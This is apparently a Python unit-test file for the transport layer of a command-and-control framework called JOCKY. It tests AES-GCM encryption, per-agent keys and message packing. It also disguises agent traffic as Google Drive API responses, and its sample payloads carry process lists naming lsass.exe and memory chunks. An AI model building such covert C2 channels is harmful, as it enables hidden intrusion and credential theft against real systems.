"""
transport/test_phase14.py -- JOCKY Phase 14 offline unit tests
No live C2 needed. Tests: AES-256-GCM, message pack/unpack, key derivation,
file ID generation, CloudAPIWrapper instantiation.
Run: python -m transport.test_phase14
"""
import os, sys, json, base64
sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent.parent))

def test_crypto():
    from transport.cloud_api_wrapper import AES256GCM
    key    = os.urandom(32)
    cipher = AES256GCM(key)
    for pt in [b"hello JOCKY", b"A"*1, b"B"*1000, os.urandom(256)]:
        ct        = cipher.encrypt(pt, aad=b"test-agent")
        recovered = cipher.decrypt(ct, aad=b"test-agent")
        assert recovered == pt, f"round-trip failed on {len(pt)}-byte payload"
    print("[+] AES-256-GCM encrypt/decrypt: OK")

def test_wrong_aad():
    from transport.cloud_api_wrapper import AES256GCM
    key    = os.urandom(32)
    cipher = AES256GCM(key)
    ct = cipher.encrypt(b"secret", aad=b"agent-A")
    try:
        cipher.decrypt(ct, aad=b"agent-B")
        assert False, "should have raised on wrong AAD"
    except Exception:
        pass
    print("[+] AES-256-GCM AAD authentication: OK (wrong AAD rejected)")

def test_key_derivation():
    from transport.cloud_api_wrapper import CloudAPIWrapper
    psk = b"X" * 32
    k1  = CloudAPIWrapper._derive_key(psk, b"agent-A")
    k2  = CloudAPIWrapper._derive_key(psk, b"agent-B")
    k1b = CloudAPIWrapper._derive_key(psk, b"agent-A")
    assert k1 != k2,  "different agents must get different keys"
    assert k1 == k1b, "same input must produce same key (deterministic)"
    assert len(k1) == 32
    print("[+] per-agent HKDF-SHA256 key derivation: OK")

def test_file_id():
    from transport.cloud_api_wrapper import CloudAPIWrapper
    fid = CloudAPIWrapper._make_file_id("jocky-agent-01")
    assert len(fid) == 36,    f"expected UUID length 36, got {len(fid)}"
    assert fid.count("-") == 4, "expected 4 dashes in UUID"
    fid2 = CloudAPIWrapper._make_file_id("jocky-agent-01")
    assert fid == fid2, "file_id must be deterministic"
    fid3 = CloudAPIWrapper._make_file_id("jocky-agent-02")
    assert fid != fid3, "different agents must get different file IDs"
    print(f"[+] Drive file ID generation: OK  (sample: {fid})")

def test_message_pack_unpack():
    from transport.cloud_api_wrapper import CloudAPIWrapper, AES256GCM
    psk = b"JOCKY_DEMO_PSK_32_BYTES_12345678"

    # manually construct a wrapper instance without network
    api              = object.__new__(CloudAPIWrapper)
    api.agent_id     = "test-agent-01"
    api._seq         = 0
    api._session_key = CloudAPIWrapper._derive_key(psk, b"test-agent-01")
    api._cipher      = AES256GCM(api._session_key)
    api._file_id     = CloudAPIWrapper._make_file_id("test-agent-01")

    payloads = [
        {"hello": "world"},
        {"proc_list": ["svchost.exe", "lsass.exe"], "count": 2},
        {"memory_chunk": base64.b64encode(os.urandom(256)).decode()},
    ]
    for payload in payloads:
        encoded              = api._pack_message(0x01, payload)
        msg_type, recovered  = api._unpack_message(encoded)
        assert msg_type == 0x01
        assert recovered == payload, f"mismatch: {recovered!r} != {payload!r}"

    print(f"[+] message pack/unpack ({len(payloads)} payloads): OK")

def test_sequence_counter():
    from transport.cloud_api_wrapper import CloudAPIWrapper, AES256GCM
    psk = b"JOCKY_DEMO_PSK_32_BYTES_12345678"
    api             = object.__new__(CloudAPIWrapper)
    api.agent_id    = "seq-test"
    api._seq        = 0
    api._session_key= CloudAPIWrapper._derive_key(psk, b"seq-test")
    api._cipher     = AES256GCM(api._session_key)
    api._file_id    = CloudAPIWrapper._make_file_id("seq-test")

    e1 = api._pack_message(0x04, {"beat": 1})
    e2 = api._pack_message(0x04, {"beat": 2})
    assert e1 != e2, "same payload at different seq must produce different ciphertext"
    print("[+] sequence counter anti-replay: OK (seq=1 != seq=2 ciphertext)")

def test_drive_response_wrapper():
    from transport.cloud_api_wrapper import CloudAPIWrapper, AES256GCM
    psk = b"JOCKY_DEMO_PSK_32_BYTES_12345678"
    api             = object.__new__(CloudAPIWrapper)
    api.agent_id    = "wrap-test"
    api._seq        = 0
    api._session_key= CloudAPIWrapper._derive_key(psk, b"wrap-test")
    api._cipher     = AES256GCM(api._session_key)
    api._file_id    = CloudAPIWrapper._make_file_id("wrap-test")

    content_b64 = api._pack_message(0x03, {"result": "ok"})
    envelope    = api._drive_response_wrapper(content_b64, name="report.bin")

    assert envelope["kind"]     == "drive#file"
    assert envelope["mimeType"] == "application/octet-stream"
    assert "content" in envelope
    assert "modifiedTime" in envelope

    # round-trip: extract content and decrypt
    extracted       = api._extract_content(json.dumps(envelope).encode())
    msg_type, data  = api._unpack_message(extracted)
    assert msg_type == 0x03
    assert data == {"result": "ok"}
    print("[+] Drive API response envelope wrap/extract: OK")

if __name__ == "__main__":
    print("\n[*] JOCKY Phase 14 -- offline unit tests\n")
    tests = [
        test_crypto,
        test_wrong_aad,
        test_key_derivation,
        test_file_id,
        test_message_pack_unpack,
        test_sequence_counter,
        test_drive_response_wrapper,
    ]
    passed = failed = 0
    for fn in tests:
        try:
            fn()
            passed += 1
        except Exception as e:
            print(f"[-] {fn.__name__} FAILED: {e}")
            import traceback; traceback.print_exc()
            failed += 1

    print(f"\n{'='*45}")
    print(f"[*] Results: {passed} passed  {failed} failed")
    if failed == 0:
        print("[+] Phase 14 transport layer: ALL TESTS PASSED")
    else:
        print("[-] Fix failures above before moving to phase 15")
    print(f"{'='*45}\n")